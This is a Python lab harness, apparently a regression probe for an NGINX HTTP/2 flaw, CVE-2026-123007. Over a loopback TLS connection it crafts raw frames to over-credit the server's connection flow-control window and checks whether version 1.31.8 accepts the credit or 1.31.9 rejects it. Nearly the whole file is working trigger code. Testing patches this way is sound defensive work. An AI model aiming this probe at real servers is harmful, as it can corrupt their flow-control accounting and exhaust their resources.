#!/usr/bin/env python3
"""NGINX2Root accounting probe — CVE-2026-123007 lab harness.

Drives a loopback-only HTTP/2 connection against 127.0.0.1:8443 with a
hand-rolled frame client, to test the connection flow-control accounting:

  1. SETTINGS INITIAL_WINDOW_SIZE = 2^31-1 (max stream window)
  2. connection WINDOW_UPDATE W1 = 2^31-1 - 65535  -> send_window = MAX
  3. GET /blob on stream 1; the first burst (~2MB, "http write filter
     limit") charges send_window at QUEUE time (filter:1241); the loopback
     socket absorbs ~1.8MB and blocks
  4. 100 fresh GET streams: each new send_chain creates (and charges) one
     32KB chunk whose flush fails on the full socket, building ~3MB of
     queued-unsent DATA while send_window bookkeeping looks legal
  5. connection WINDOW_UPDATE FINAL = 2.5MB, sized between the flushed
     total (~2MB) and the total charged (~5MB)

Server state after step 5 (1.31.8 guard, v2.c:2564: accept iff w <= charged):
  send_window refilled by 2.5MB while ~3MB stays committed-unsent, so the
  true protocol window P = send_window + queued_unsent exceeds MAX.
The 1.31.9 guard (MAX - send_window - send_queued, accept iff w <= charged
- queued) must reject FINAL instead: GOAWAY(FLOW_CONTROL_ERROR) +
"client violated connection flow control" log.

Never contacts anything but 127.0.0.1.
"""

import json
import socket
import ssl
import struct
import sys
import time

HOST, PORT = "127.0.0.1", 8443
MAX_WINDOW = 0x7FFFFFFF
BLOB = 64 * 1024 * 1024          # lab/corpus/blob size
W1 = MAX_WINDOW - 65535          # 2147418112 -> send_window = MAX
N_STREAMS = 100                  # fresh GETs to build queued-unsent ~3MB
FINAL = 2560 * 1024              # 2621440, in the band (flushed ~2MB, c ~5MB)

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FT_DATA, FT_HEADERS, FT_SETTINGS, FT_PING, FT_GOAWAY, FT_WU = 0, 1, 4, 6, 7, 8
FLAG_END_STREAM, FLAG_END_HEADERS, FLAG_ACK = 0x1, 0x4, 0x1


def frame(ftype, flags, sid, payload=b""):
    return len(payload).to_bytes(3, "big") + bytes([ftype, flags]) + \
        struct.pack(">I", sid) + payload


def window_update(sid, inc):
    return frame(FT_WU, 0, sid, struct.pack(">I", inc))


def headers_block():
    # HPACK: :method GET (idx 2), :scheme https (idx 7),
    # :path /blob (literal, name idx 4), :authority localhost (name idx 1)
    return bytes([0x82, 0x87, 0x44, 5]) + b"/blob" + \
        bytes([0x41, 9]) + b"localhost"


def drain(tls, seconds, cap=128 * 1024):
    """Read up to cap bytes for `seconds`; return (bytes, eof_seen)."""
    tls.settimeout(0.3)
    buf = b""
    eof = False
    end = time.time() + seconds
    while len(buf) < cap and time.time() < end:
        try:
            chunk = tls.recv(16384)
        except (socket.timeout, TimeoutError):
            continue
        if not chunk:
            eof = True
            break
        buf += chunk
    return buf, eof


def parse_frames(buf, start=0):
    """Walk complete frames from `start`; return (frames, next_offset).
    The decrypted stream is frame-aligned from offset 0, so callers must
    parse the CONCATENATION of all reads, never a later read alone."""
    frames = []
    i = start
    while i + 9 <= len(buf):
        length = int.from_bytes(buf[i:i + 3], "big")
        ftype, flags = buf[i + 3], buf[i + 4]
        sid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7FFFFFFF
        if i + 9 + length > len(buf):
            break
        frames.append((ftype, flags, sid, length, buf[i + 9:i + 9 + length]))
        i += 9 + length
    return frames, i


def main():
    result = {
        "build": sys.argv[1] if len(sys.argv) > 1 else "?",
        "w1": W1, "n_streams": N_STREAMS, "final": FINAL, "blob": BLOB,
        "advertised_total": 65535 + W1 + FINAL,
    }

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # tiny receive buffer: keeps the server's queue deep (queued-unsent DATA)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    sock.settimeout(5)
    sock.connect((HOST, PORT))
    tls = ctx.wrap_socket(sock, server_hostname="localhost")
    result["alpn"] = tls.selected_alpn_protocol()

    # phase 1-3: preface + SETTINGS(max stream window), W1, GET /blob
    settings = struct.pack(">HI", 0x4, MAX_WINDOW)   # INITIAL_WINDOW_SIZE
    tls.sendall(PREFACE + frame(FT_SETTINGS, 0, 0, settings)
                + window_update(0, W1)
                + frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, 1,
                        headers_block()))
    pre, _ = drain(tls, 1.5, cap=16 * 1024)
    result["bytes_before_streams"] = len(pre)

    # let the worker run the first burst (~2MB write-filter limit); the
    # loopback socket absorbs ~1.8-1.9MB and then blocks
    time.sleep(3)

    # phase 4: build queued-unsent with NEW streams. Each fresh GET runs its
    # own send_chain; the first 32KB chunk is created (charged at queue time,
    # filter:1241) before the flush attempt, which fails on the full socket,
    # so the chunk stays queued-unsent. The stream is socket-blocked, not
    # flow-control-blocked, so no later WU wake touches it (v2.c:2577).
    frames = b""
    for i in range(N_STREAMS):
        sid = 3 + 2 * i
        frames += frame(FT_HEADERS, FLAG_END_HEADERS | FLAG_END_STREAM, sid,
                        headers_block())
    try:
        tls.sendall(frames)
        result["streams_sent"] = True
    except (OSError, ssl.SSLError) as e:
        result["streams_sent"] = False
        result["streams_error"] = repr(e)
    time.sleep(3)

    # phase 5: the over-credit WU. 1.31.8 guard accepts iff w <= total
    # charged c (= burst + N_STREAMS chunks). 1.31.9 guard accepts iff
    # w <= c - q where q = queued-unsent ~= N_STREAMS chunks; with c ~ 5MB
    # and c - q ~ 2MB, FINAL sits between the two guards.
    try:
        tls.sendall(window_update(0, FINAL))
        result["final_sent"] = True
    except (OSError, ssl.SSLError) as e:
        result["final_sent"] = False
        result["final_error"] = repr(e)

    time.sleep(1)

    try:
        tls.sendall(frame(FT_PING, 0, 0, b"probe000"))  # liveness check
        result["ping_sent"] = True
    except (OSError, ssl.SSLError) as e:
        result["ping_sent"] = False
        result["ping_error"] = repr(e)

    # drain deep enough to flush the queued DATA in front of any GOAWAY
    # (~6.5MB queued-unsent at this point); on 1.31.8 this just streams
    # more of the file, on 1.31.9 the GOAWAY surfaces behind the queue
    post, conn_eof = drain(tls, 8, cap=16 * 1024 * 1024)
    result["bytes_after_wus"] = len(post)
    result["conn_eof"] = conn_eof

    # parse the WHOLE decrypted stream (aligned from byte 0), never a
    # later read alone: reads after a blocked phase resume mid-frame
    all_frames, _ = parse_frames(pre + post)
    result["frames_total"] = len(all_frames)
    result["goaway"] = None
    for ftype, flags, sid, flen, payload in all_frames:
        if ftype == FT_GOAWAY and len(payload) >= 8:
            result["goaway"] = {
                "last_sid": int.from_bytes(payload[0:4], "big") & 0x7FFFFFFF,
                "error_code": int.from_bytes(payload[4:8], "big"),
            }
            break

    # verdict: over-credit accepted iff the final WU went out and the
    # server neither sent GOAWAY nor killed the connection (1.31.9's
    # worker closes without flushing the queued GOAWAY, so EOF is the
    # client-side rejection signal; 1.31.8 streams DATA endlessly)
    result["over_credit_accepted"] = (
        result["final_sent"] and result["goaway"] is None
        and not conn_eof)

    tls.close()
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
